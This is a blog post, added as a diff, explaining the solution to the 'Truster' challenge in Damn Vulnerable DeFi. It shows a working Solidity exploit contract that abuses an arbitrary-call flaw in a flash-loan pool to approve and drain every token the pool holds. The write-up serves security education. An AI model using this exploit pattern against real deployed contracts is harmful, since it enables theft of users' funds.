@@ -1,0 +1,132 @@
+---
+isDraft: false
+title: 'Damn Vulnerable DeFi Challenge #3 solution'
+description: 'Explanation of solution to Damn Vulnerable Defi Challenge #3: Truster'
+tags: ['defi', 'solidity']
+series: 'Damn Vulnerable DeFi'
+publishDate: 'Feb 20, 2023 05:48 PM'
+---
+
+import Quote from '../../../components/Quote.mdx'
+import FormattedDate from '../../../components/FormattedDate'
+
+# {frontmatter.title}
+
+<Quote />
+
+_Published <FormattedDate client:only="react" date={props.date} />_
+
+> ## Challenge #3 - Truster
+>
+> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
+>
+> The pool holds 1 million DVT tokens. You have nothing.
+>
+> To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.
+
+The pool's `flashLoan` function implements some preventative measures against attacks. Namely, it uses the nonReentrant modifier and an if statement that reverts if its balance is less than its balance before the transfer.
+
+```solidity
+// contracts/truster/TrusterLenderPool.sol
+
+function flashLoan(
+    uint256 amount,
+    address borrower,
+    address target,
+    bytes calldata data
+) external nonReentrant returns (bool) {
+    uint256 balanceBefore = token.balanceOf(address(this));
+
+    token.transfer(borrower, amount);
+    target.functionCall(data);
+
+    if (token.balanceOf(address(this)) < balanceBefore)
+        revert RepayFailed();
+
+    return true;
+}
+```
+
+There is a single line that throws the contract's security out the window.
+
+`target.functionCall(data);`
+
+It may seem fine since the contract checks its token balance after the function call, but allowing arbitrary function calls is almost never a good idea. It is extremely tricky to audit interactions with external contracts.
+
+The DVT contract inherits from Solmate's ERC20 + EIP-2312 implementation. One method from the ERC-20 specification stands out:
+
+> ### approve
+>
+> Allows `_spender` to withdraw from your account multiple times, up to the `_value` amount. If this function is called again it overwrites the current allowance with `_value`.
+
+Solmate implements it in its ERC20 contract:
+
+```solidity
+// node_modules/solmate/src/tokens/ERC20.sol
+
+function approve(
+    address spender,
+    uint256 amount
+) public virtual returns (bool) {
+    allowance[msg.sender][spender] = amount;
+
+    emit Approval(msg.sender, spender, amount);
+
+    return true;
+}
+```
+
+Since the pool allows us to call any function on its behalf, we can call `approve` with the pool as `msg.sender`. We can set our own allowance, and then transfer the pool's balance to ourselves!
+
+These two actions must be done separately because `flashLoan` would revert if we simply transferred the tokens to ourselves (`RepayFailed`). We can perform multiple actions in a single transaction by executing them in a contract's `constructor`.
+
+Let's create a contract that takes control of all of the pool's tokens. The contract then transfers the tokens to a beneficiary (us).
+
+```solidity
+// contracts/truster/Trustee.sol
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./TrusterLenderPool.sol";
+
+contract Trustee {
+    constructor(TrusterLenderPool pool) {
+        pool.flashLoan(
+            // "amount" has to be 0.
+            // We can't borrow because we won't be repaying a loan.
+            0,
+            // "borrower" can be any address since we're not borrowing.
+            address(0),
+            // "target" is the contract we are calling.
+            address(pool.token()),
+            // "data" is what we call "target" with.
+            // We send the approve function's signature along with its arguments.
+            // We approve an unlimited amount for Trustee to manage.
+            abi.encodeWithSignature(
+                "approve(address,uint256)",
+                address(this),
+                type(uint256).max
+            )
+        );
+
+        pool.token().transferFrom(
+            address(pool),
+            msg.sender,
+            pool.token().balanceOf(address(pool))
+        );
+    }
+}
+```
+
+Now we just compile and deploy `Trustee`. It will transfer all tokens to the deployer on deployment.
+
+```js
+// test/truster/truster.challenge.js
+
+it('Execution', async function () {
+  await (
+    await ethers.getContractFactory('Trustee', player)
+  ).deploy(pool.address)
+})
+```
